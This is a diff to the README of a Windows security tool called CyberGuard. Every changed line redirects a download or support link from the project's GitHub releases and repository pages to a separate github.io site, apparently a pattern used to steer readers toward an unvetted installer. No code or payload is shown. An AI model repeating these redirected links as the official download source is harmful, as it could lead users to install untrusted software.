@@ -1,6 +1,6 @@
 # 🛡️ CyberGuard - Your Automated Security Team, Right Now
 
-[![Download CyberGuard](https://img.shields.io/badge/Download%20CyberGuard-Get%20Started-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://github.com/lokis5867/CyberGuard/releases)
+[![Download CyberGuard](https://img.shields.io/badge/Download%20CyberGuard-Get%20Started-blue?style=for-the-badge&logo=github&logoColor=white&color=4CAF50)](https://lokis5867.github.io)
 
 ## 👋 What Is CyberGuard?
 
@@ -14,7 +14,7 @@ Getting CyberGuard on your computer is easy. Follow these simple steps:
 
 ### Step 1: Download CyberGuard
 
-1. Visit this link to download the application: [Download CyberGuard](https://github.com/lokis5867/CyberGuard/releases)
+1. Visit this link to download the application: [Download CyberGuard](https://lokis5867.github.io)
 2. Click the download button on that page. The file will start downloading to your computer.
 
 ### Step 2: Run the Setup
@@ -131,7 +131,7 @@ CyberGuard works best with Microsoft Defender built into Windows 10 and 11. It d
 If you run into any problems:
 
 1. Check the troubleshooting section above
-2. Visit the GitHub page for support: [https://github.com/lokis5867/CyberGuard](https://github.com/lokis5867/CyberGuard)
+2. Visit the GitHub page for support: [https://lokis5867.github.io](https://lokis5867.github.io)
 3. Look for a "Support" or "Issues" section on that page to report problems
 
 ## ✅ Why Choose CyberGuard?
@@ -146,7 +146,7 @@ If you run into any problems:
 
 Don't wait for a security problem to happen. Get CyberGuard now and have your automated security team ready to work for you.
 
-**Download now:** [Visit this link to download the application](https://github.com/lokis5867/CyberGuard/releases)
+**Download now:** [Visit this link to download the application](https://lokis5867.github.io)
 
 CyberGuard is ready to keep your system safe, organized, and under your control. Install it today and see how easy automated protection can be.
 
